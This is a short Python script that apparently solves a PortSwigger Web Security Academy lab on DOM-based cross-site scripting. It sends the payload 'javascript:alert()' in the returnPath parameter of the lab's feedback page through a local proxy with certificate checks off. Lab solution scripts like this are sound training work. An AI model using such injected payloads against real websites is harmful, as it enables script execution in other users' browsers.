import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink
# author: 0xyf


class XSS5:
    def __init__(self):
        self.lab_id = "0a66001f04e2177e856040570083009e"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.vuln_url = f"{self.url}/feedback"
        self.proxies = {"https": "http://127.0.0.1:8080"}

    def execute_request(self, payload):
        params = {"returnPath": payload}
        r = requests.get(
            f"{self.vuln_url}",
            params=params,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def dom_xss(self):
        payload = "javascript:alert()"
        r = self.execute_request(payload)

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.dom_xss()
        self.check_solved()


def main():
    XSS5().solve()


if __name__ == "__main__":
    main()
